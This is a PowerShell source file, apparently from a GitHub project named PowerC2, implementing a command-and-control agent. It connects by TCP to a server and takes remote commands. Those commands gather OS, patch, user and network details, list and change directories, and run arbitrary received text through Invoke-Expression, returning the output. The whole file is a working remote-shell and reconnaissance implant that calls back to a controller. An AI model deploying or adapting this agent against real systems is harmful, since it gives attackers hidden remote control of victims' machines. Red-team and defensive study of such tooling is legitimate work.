###############################################################################################################
# Language     :  PowerShell 5
# Filename     :  PowerAgent.ps1 
# Author       :  Theodore (Tad) Miller (https://github.com/tadmiller)
# Description  :  All-Powershell Command & Control Client
# Repository   :  https://github.com/tadmiller/PowerC2
###############################################################################################################

<#
    .SYNOPSIS
    Simple Powershell Command & Control Client

    .DESCRIPTION
    This client is the agent in which the PowerC2 interacts with.

    .EXAMPLE
    .\PowerAgent.ps1


    .LINK
    https://github.com/tadmiller/PowerC2/blob/master/README.md
#>

function SendMessage($stream, $msg)
{
    $data = [text.Encoding]::Ascii.GetBytes($msg)
    $stream.Write($data, 0, $data.length)
    $stream.Flush()
}

function ReceiveData($buffer)
{
    do {
            $return = $stream.Read($buffer, 0, $buffer.Length)
            $msg += [text.Encoding]::Ascii.GetString($buffer[0..($return-1)])   
    } while ($stream.DataAvailable)

    return $msg
}

function CmdOSInfo()
{
    $str = ""
    $osInfo = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName
    $str += "Operating System : " + $osInfo.Caption + "`n"
    $str += "Architecture     : " + $osInfo.OSArchitecture + "`n"
    $str += "Service Pack     : " + $osInfo.ServicePackMajorVersion + "`n"
    $str += "Hostname         : " + $osInfo.CSName + "`n"
    $str += "Version          : " + $osInfo.Version + "`n"

    return $str
}

function CmdLS()
{
    $files = @(Get-ChildItem)
    $str = ""

    foreach ($file in $files)
    {
        $str += $file.Name + "`n"
    }

    return $str
}

function Main()
{
    $remoteHost = "127.0.0.1"
    $port = 9001

    Write-Host -NoNewline -ForegroundColor Yellow "`nConnecting to" $remoteHost":"$port "`n"

    $server = New-Object System.Net.Sockets.TcpClient($remoteHost, $port)

    if ($server -eq $null)
    {
        Write-Host -ForegroundColor Red "Failed to connect to server. Exiting."
        exit 1
    }

    Write-Host -ForegroundColor Green "Successfully connected to server."

    $stream = $server.GetStream()

    [byte[]] $buffer = New-Object byte[] 5KB

    do
    {
        $msg = ReceiveData($buffer)
        $response = $null

        switch -Wildcard ($msg)
        {
            "pwd" {
                SendMessage $stream $pwd.Path
                break
            }
            "ls" {
                $response = CmdLS
                Write-Host $response
                SendMessage $stream $response
                break
            }
            "cd*" {
                $response = $msg.SubString(3, $msg.Length - 3)
                Set-Location $response
                SendMessage $stream $response
                break
            }
            "getos" {
                $response = CmdOSInfo
                SendMessage $stream $response
                break
            }
            "getpatch" {
                $response = Get-HotFix | Out-String
                SendMessage $stream $response
                break
            }
            "whoami" {
                $response = $env:ComputerName + "\" + $env:UserName
                SendMessage $stream $response
                break
            }
            "netstat" {
                $response = Get-NetTCPConnection | Out-String
                SendMessage $stream $response
                break
            }
            "scan*" {
                break
            }
            "console*" {
                $msg = $msg.SubString(8, $msg.Length - 8)

                Try
                {
                    $response = Invoke-Expression $msg | Out-String
                }
                Catch
                {
                    $response = "Command error"
                }

                SendMessage $stream $response
                
                break
            }
            "quit" {
                SendMessage $stream "C2 Agent exiting..."
                Write-Host -BackgroundColor Red "Exiting..."

                $stream.Close()

                $server.Close()
                exit 1
            }
            "ret" {
                SendMessage $stream "Leaving session active..."
                break
            }
            default {
                Write-Host "Command not recognized"
                SendMessage $stream "Command not recognized"
            }
        }

        #$input = Read-Host "`n$"
    } while ($msg -ne "q" -and $msg -ne "quit" -and $msg -ne "exit")
}

Main